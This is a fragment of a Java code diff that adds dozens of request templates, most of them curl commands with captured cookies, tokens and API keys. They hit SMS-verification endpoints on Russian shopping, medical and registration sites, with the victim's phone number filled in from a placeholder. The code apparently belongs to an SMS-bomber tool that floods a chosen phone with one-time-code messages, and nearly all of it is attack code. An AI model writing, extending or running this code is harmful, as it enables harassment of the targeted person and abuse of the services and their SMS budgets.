+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'bx-ajax: true' \\\n" +
+                        "  -H 'content-type: application/x-www-form-urlencoded' \\\n" +
+                        "  -H 'cookie: PHPSESSID=c317d05aac9ca023a290f06b2d88740b; BITRIX_SM_SALE_UID=25316472; BITRIX_SM_SELECTED_CITY_CODE=0000073738; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1688763540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.1.923212795.1688731854; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_uid=1688731855610491033; _ym_d=1688731855; _ga_K6FJY61J0S=GS1.1.1688731854.1.1.1688731854.60.0.0; _ym_isad=2; _ym_visorc=w; tmr_lvid=ecdde2ab63feaf3850385c46e15ff6b8; tmr_lvidTS=1688731855075; _ymab_param=bzRQ384yMEtBC5vJtOQNPpxb45RC_bXaIMiSfSMmAAKRykv0aUUTorl53X8FGPFJq5hlKYJ0VXZVfJ7uOJ75SO7rRso; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1688731857426' \\\n" +
+                        "  -H 'origin: https://vsesmart.ru' \\\n" +
+                        "  -H 'referer: https://vsesmart.ru/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  -H 'x-bitrix-csrf-token: 4e748e24b4a55173d205b36e82f14323' \\\n" +
+                        "  -H 'x-bitrix-site-id: s1' \\\n" +
+                        "  --data-raw 'phone=%2B{phone:7(***)***-**-**}&isRegister=&token=' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://kino.tricolor.tv/api/register.php' \\\n" +
+                        "  -H 'authority: kino.tricolor.tv' \\\n" +
+                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/json' \\\n" +
+                        "  -H 'cookie: __jhash_=682; __jua_=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; __hash_=0f83c4605e0610c6675921681e652be2; __lhash_=2ea6451564c0d750287211d8703fed4b; BITRIX_SM_SALE_UID=0; _gcl_au=1.1.317778883.1688732303; _ga_LF800FZY0Z=GS1.1.1688732303.1.0.1688732303.0.0.0; _ga=GA1.2.403171781.1688732304; _gid=GA1.2.1752351711.1688732307; _gat_UA-70840377-1=1; _gat_UA-46398561-16=1; tmr_lvid=8bd5856e1ad9be03c12e7e2370720a92; tmr_lvidTS=1648227495252; _ym_uid=1648227495934785743; _ym_d=1688732307; __js_p_=305,1800,0,0,0; tmr_detect=0%7C1688732309480; _ym_isad=2; _ym_visorc=b; afUserId=77c764ec-ac1d-4b63-b703-f6801bedb257-p; AF_SYNC=1688732310778; PHPSESSID=Mv1z2N1RBcK9irl40drL611EvTQm6Pps' \\\n" +
+                        "  -H 'origin: https://kino.tricolor.tv' \\\n" +
+                        "  -H 'referer: https://kino.tricolor.tv/?login&utm_source=lk.tricolor.tv&utm_medium=referral&utm_campaign=lk.tricolor.tv&utm_referrer=lk.tricolor.tv' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  --data-raw '{\"phone\":\"{full_phone}\",\"tricolorId\":\"\",\"action\":null,\"sms\":null}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://api.loverepublic.ru/web/v1/user/auth' \\\n" +
+                        "  -H 'authority: api.loverepublic.ru' \\\n" +
+                        "  -H 'accept: application/json' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'authorization: Bearer e1dbc1c7954b60a1df094bd7d48b39f594b5c4dc239bb2830ce13fc2b3d87a3e' \\\n" +
+                        "  -H 'content-type: application/json' \\\n" +
+                        "  -H 'origin: https://loverepublic.ru' \\\n" +
+                        "  -H 'referer: https://loverepublic.ru/catalog/sale/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-site' \\\n" +
+                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  --data-raw '{\"name\":\"\",\"lastName\":\"\",\"email\":\"\",\"phone\":\"+7 {phone:(***) ***-**-**}\",\"action\":null}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://sravni.id/signin/code' \\\n" +
+                        "  -H 'authority: sravni.id' \\\n" +
+                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
+                        "  -H 'cookie: .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8P-kIPzZhllNqNW6zllVLAdMgC_Qf8_coTRI2iK-w-aXxTPMPdcSeWC-rGayiM4IQkShS-HlV3EMF4r4QvnJcL8fMmrEsCzF3mGkOIptILXeT6Yb5QFCOoOSfYOPWEfB5BVDurdEAnZ7N9w5WRp123c; __cf_bm=14DkP67ue9BjtUVqFUlzw5KxJOzMhXO91XzJX0QDJII-1689622732-0-AUtqf2WgLB3AC91m/QfsIt7wEtzI1LGJSlKud0+1yVpKRT19HM+mxZksyc8sVAFrPVNdlN+myNMMjBc4uGaSaRI=; _cfuvid=8ZczhhAMAOXzGK7CtSOtQO0tCgrTxHtu1rt76NjJS1g-1689622732596-0-604800000' \\\n" +
+                        "  -H 'origin: https://sravni.id' \\\n" +
+                        "  -H 'referer: https://sravni.id/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520reviews%2520esia%2520orders.r%2520messagesender.sms%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.VZR.Service%2520Sravni.Affiliates.Service%2520Sravni.News.Service%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fv2%252Fcallback%252F%26display%3Dpopup%26response_mode%3Dform_post%26state%3DtSfMLpp_vvSFc-XTzmwm_zh7jtg9GWkIugoEpzjpG_Y%26nonce%3D_pEEawHb2Hlgr7yLexFQZ8iwds29iab-SYB8d6fNeB4' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
+                        "  --data-raw '__RequestVerificationToken=CfDJ8P-kIPzZhllNqNW6zllVLAe3kD11i4o6PJwkMs1YGVoc9UcbSg92a5Y8PvGjEJpAj9OH27TdnIZT4O-UgcSs28xlKhKV7RAcL-QjlDTujrRSdT9NpC-rtpxFGSaEBBOtzKvKNOe1Q2trdR_tRWDRa3k&phone=%2B{full_phone}&returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520reviews%2520esia%2520orders.r%2520messagesender.sms%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.VZR.Service%2520Sravni.Affiliates.Service%2520Sravni.News.Service%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fv2%252Fcallback%252F%26display%3Dpopup%26response_mode%3Dform_post%26state%3DtSfMLpp_vvSFc-XTzmwm_zh7jtg9GWkIugoEpzjpG_Y%26nonce%3D_pEEawHb2Hlgr7yLexFQZ8iwds29iab-SYB8d6fNeB4' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://zdorov.ru/backend/api/customer/confirm' \\\n" +
+                        "  -H 'Accept: application/json' \\\n" +
+                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'Authorization;' \\\n" +
+                        "  -H 'Cache-Control: max-age=0' \\\n" +
+                        "  -H 'Connection: keep-alive' \\\n" +
+                        "  -H 'Content-Type: application/json' \\\n" +
+                        "  -H 'Cookie: qrator_jsr=1689622959.160.f6q4CAduxyTf1rsG-5gfcunfhk920271k1q8lb8m16obh35c3-00; qrator_jsid=1689622959.160.f6q4CAduxyTf1rsG-fjsnaqhr7gpjodsvcori4689hufhcd3s; qrator_ssid=1689622959.513.utJ9aMgZ8yhtBpQF-g817gbivabgq0t267p17j41pn31n7mp3; zdr_customer_external_id=e407b425-ad72-47ad-9d72-fd2a063025a3; _ym_uid=16707803281068577902; _ym_d=1689622964; _ym_isad=2; _ym_visorc=w; is-converted-basket=true; is-converted-liked=true; storage-shipment=%7B%22stockId%22%3A0%2C%22cityId%22%3A1%2C%22shipAddressId%22%3A0%2C%22shipAddressTitle%22%3A%22%22%2C%22stockTitle%22%3A%22%22%7D' \\\n" +
+                        "  -H 'Origin: https://zdorov.ru' \\\n" +
+                        "  -H 'Referer: https://zdorov.ru/' \\\n" +
+                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
+                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
+                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
+                        "  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  --data-raw '{\"phone\":\"{full_phone}\",\"deviceId\":null,\"term\":2}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://khesflowers.ru/index.php?route=extension/module/sms_reg_khes/SmsCheck' \\\n" +
+                        "  -H 'authority: khesflowers.ru' \\\n" +
+                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
+                        "  -H 'cookie: PHPSESSID=edfaddbc9139c97d8af81afd3cd16a1c; default=94b88df688d8db6df633dfce42814803; prmn_fias=4700; language=ru-ru; currency=RUB; sitecreator_hasWebP=1; _ga_8ND8TB3BYH=GS1.1.1689623016.1.0.1689623016.60.0.0; _ga=GA1.2.1676326641.1689623016; _gid=GA1.2.821168971.1689623016; _gat_gtag_UA_196378717_1=1; _gat_UA-196378717-1=1; roistat_visit=902665; roistat_first_visit=902665; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; prmn_confirm=1; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit; _hjSessionUser_2693180=eyJpZCI6ImRkYmUzM2E1LTVkODQtNTYwMS05YzFmLWQ3NWQ4MTM2M2MxMyIsImNyZWF0ZWQiOjE2ODk2MjMwMTY2MzksImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2693180=0; _hjSession_2693180=eyJpZCI6Ijg2NzBlYTMyLWRmYzItNDI5OS05MmVkLWZkOWE5ZDE4OGQyZiIsImNyZWF0ZWQiOjE2ODk2MjMwMTY2NDcsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; ___dc=c1d2a49f-10c1-4c9b-b99f-f1166b9ba0e5; _ym_uid=1689623019351468204; _ym_d=1689623019; _ym_isad=2; tmr_lvid=c80c9fdf8a2ef0f00341556eb08b459a; tmr_lvidTS=1689623020046; tmr_detect=0%7C1689623022539' \\\n" +
+                        "  -H 'origin: https://khesflowers.ru' \\\n" +
+                        "  -H 'referer: https://khesflowers.ru/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
+                        "  --data-raw 'user_validation_83963=1&phone=%2B{phone:7+(***)+***-**-**}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://pass.ska.ru/registration/send-cod/' \\\n" +
+                        "  -H 'authority: pass.ska.ru' \\\n" +
+                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
+                        "  -H 'cookie: _ym_uid=1683473292741918790; _ym_d=1683473292; PHPSESSID=62617b87391e9b23cfb9837de0d4895a; _ym_isad=2; _ga_33Q6G79T6Y=GS1.1.1689623142.1.0.1689623142.60.0.0; _ym_visorc=w; _ga=GA1.2.361164651.1689623142; _gid=GA1.2.2090849296.1689623142; _gat_gtag_UA_19620142_22=1; _HC_4379=N@KONFI24pQlCk0Nzzzzzzzz:C4379G108:1692215141; _HC_uu=N@KONFI24pQlBk0Nzzzzzzzz; _HC_fr=:::1689623141; _HC_v4379=AmS1mmUAAQAA~N%40KONFI24pQlBk0N~N%40KONFI24pQlCk0Nzzzzzzzz~C4379G108' \\\n" +
+                        "  -H 'origin: https://pass.ska.ru' \\\n" +
+                        "  -H 'referer: https://pass.ska.ru/registration/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  -H 'x-csrf-token: l2_iflwWH7iMBLPGlihtwz1PlcK__52rEMN1Q4uoMgT9JLc9HntZyM9g64X0QASTCxXxiPbLr9h3jj0K3PdjNQ==' \\\n" +
+                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
+                        "  --data-raw 'phone={phone}&phone_prefix=7&action=register' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://mybile.secret-kitchen.ru/api/v1/sms/send_code' \\\n" +
+                        "  -H 'Accept: */*' \\\n" +
+                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'Business: sk' \\\n" +
+                        "  -H 'Connection: keep-alive' \\\n" +
+                        "  -H 'Content-Type: application/json' \\\n" +
+                        "  -H 'Deviceid: 7a3d7b19-eaa0-4c86-8904-3dac905ae075' \\\n" +
+                        "  -H 'Origin: https://secret-kitchen.ru' \\\n" +
+                        "  -H 'Platformid: site' \\\n" +
+                        "  -H 'Referer: https://secret-kitchen.ru/' \\\n" +
+                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
+                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
+                        "  -H 'Sec-Fetch-Site: same-site' \\\n" +
+                        "  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  --data-raw '{\"phone\":\"{phone}\",\"type\":\"auth\",\"apiKey\":\"8de2926e6d7aae30f45a2e54e27a7c1dc9ad586bda6df134a8a7c4aeb4eae41b\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://parisnail.ru/ajax/mb_auth.php' \\\n" +
+                        "  -H 'authority: parisnail.ru' \\\n" +
+                        "  -H 'accept: */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
+                        "  -H 'cookie: __ddg1_=w9o5DaqFbnStwTk8Z2mU; PHPSESSID=o9fk6ai5an7ab98el5k5agn4rf; tinkoff_auth_state=A71OYomReTPrqjuiNWp6; BQ_LOCATION[CODE]=0000314680; BQ_LOCATION[NAME]=%D0%9C%D1%83%D1%80%D0%BE%D0%BC; BQ_LOCATION[PHONE]=7+%28800%29+550-98-50; BQ_LOCATION[ZIP_CODE]=309257; BQ_LOCATION[CONTACT_ID]=0; BQ_LOCATION[PHONE_TEXT]=%D0%91%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D0%BE+%D0%BF%D0%BE+%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D0%B8; BQ_LOCATION[COUNTRY_ID]=104; BX_PERSONAL_ROOT_SALE_UID=9a5f7271f1107fbe7d00ec44bb319fdc; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1689627540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _gcl_au=1.1.438093537.1689623454; _ga_SBDLEELQSN=GS1.1.1689623453.1.0.1689623453.60.0.0; _ym_uid=1683470390650589872; _ym_d=1689623454; _userGUID=0:lk7a6gu2:xjX03~bWlvQuCjEhmd~dsSIz7_fSADu4; dSesn=6d089648-0277-bbef-47d6-533ca118fefb; _dvs=0:lk7a6gu2:tHX~_gaGyjofAaWrqXHqm3W1S9POYN4Z; _clck=14t1wtp|2|fdd|0|1293; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ga=GA1.2.1908481516.1689623454; _gid=GA1.2.1011983969.1689623454; _gat_gtag_UA_85201929_1=1; _ym_visorc=w; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _clsk=gzjjt|1689623454932|1|1|y.clarity.ms/collect' \\\n" +
+                        "  -H 'origin: https://parisnail.ru' \\\n" +
+                        "  -H 'referer: https://parisnail.ru/personal/?register=yes' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
+                        "  --data-raw 'step=1&phone={full_phone}&code=&userRemember=N' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://back.bh.market/api/front/user/sendSmsCode' \\\n" +
+                        "  -H 'authority: back.bh.market' \\\n" +
+                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/json' \\\n" +
+                        "  -H 'origin: https://bh.market' \\\n" +
+                        "  -H 'referer: https://bh.market/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-site' \\\n" +
+                        "  --data-raw '{\"phone\":\"+{full_phone}\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://gateway.smartmed.pro/personal/api/users/register/v2' \\\n" +
+                        "  -H 'authority: gateway.smartmed.pro' \\\n" +
+                        "  -H 'accept: application/json' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'application-version: 2.2.0' \\\n" +
+                        "  -H 'content-type: application/json' \\\n" +
+                        "  -H 'currentdate: 2023-07-17T19:57:24Z' \\\n" +
+                        "  -H 'origin: https://online.smartmed.pro' \\\n" +
+                        "  -H 'pragma: no-cache' \\\n" +
+                        "  -H 'referer: https://online.smartmed.pro/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-site' \\\n" +
+                        "  -H 'timezone-offset: 180' \\\n" +
+                        "  --data-raw '{\"address\":null,\"birthday\":\"2000-07-13\",\"email\":null,\"firstName\":\"ЕРкркекерк\",\"gender\":1,\"lastName\":\"Пркереркр\",\"password\":\"qwertyuiop\",\"patientTypeForRegistration\":1,\"patronymic\":\"Керкеркер\",\"phone\":\"{full_phone}\",\"termsOfUse\":[{\"code\":1,\"value\":true}],\"withoutPatronymic\":false}' \\\n" +
+                        "  --compressed"),
+
+                new Service(7) {
+                    @Override
+                    public void run(OkHttpClient client, Callback callback, Phone phone) {
+                        client.newCall(new Request.Builder()
+                                .url("https://api.nuznyisport.ru/api/login/send-four-digit-code")
+                                .post(RequestBody.create("------WebKitFormBoundarytnqLgb8bRBkpig6F\n" +
+                                                "Content-Disposition: form-data; name=\"phone\"\n" +
+                                                "\n" +
+                                                phone.toString() +
+                                                "\n" +
+                                                "------WebKitFormBoundarytnqLgb8bRBkpig6F--",
+                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundarytnqLgb8bRBkpig6F")))
+                                .build()).enqueue(callback);
+                    }
+                },
+
+                new CurlService("curl 'https://api.sushifox.ru/web/auth/sendCode?client_device_type=web&uuid=t91TTy6o_wcOLmPc3oq7q' \\\n" +
+                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
+                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'Connection: keep-alive' \\\n" +
+                        "  -H 'Content-Type: application/json;charset=UTF-8' \\\n" +
+                        "  -H 'Origin: https://www.sushifox.ru' \\\n" +
+                        "  -H 'Referer: https://www.sushifox.ru/' \\\n" +
+                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
+                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
+                        "  -H 'Sec-Fetch-Site: same-site' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  --data-raw '{\"phone\":\"{full_phone}\"}' \\\n" +
+                        "  --compressed", 7),
+
+                new CurlService("curl 'https://www.coolclever.ru/v4/site/user/auth/request-code/' \\\n" +
+                        "  -H 'authority: www.coolclever.ru' \\\n" +
+                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
+                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
+                        "  -H 'content-type: application/json' \\\n" +
+                        "  -H 'cookie: _ym_uid=1683460002853721667; _ym_d=1683460002; __ddg1_=bfe9XiMDbA2SS94rRxtZ; currentRegion=77; isAuth=false; token=3274b4b6-18df-49d5-9229-35783ddf988b; tmr_lvid=f2ef7c94235f9672cc567fbc5a593487; tmr_lvidTS=1683460002311; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_isad=2; _ga=GA1.2.1591269336.1689624608; _gid=GA1.2.2031477131.1689624609; _gat_UA-209924958-1=1; adultStatus=1; _ym_visorc=w; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1689624611147; region=77; _ga_3G59J17G17=GS1.1.1689624607.1.0.1689624617.50.0.0' \\\n" +
+                        "  -H 'origin: https://www.coolclever.ru' \\\n" +
+                        "  -H 'referer: https://www.coolclever.ru/' \\\n" +
+                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
+                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
+                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
+                        "  -H 'sec-fetch-dest: empty' \\\n" +
+                        "  -H 'sec-fetch-mode: cors' \\\n" +
+                        "  -H 'sec-fetch-site: same-origin' \\\n" +
+                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
+                        "  -H 'x-app-platform: web' \\\n" +
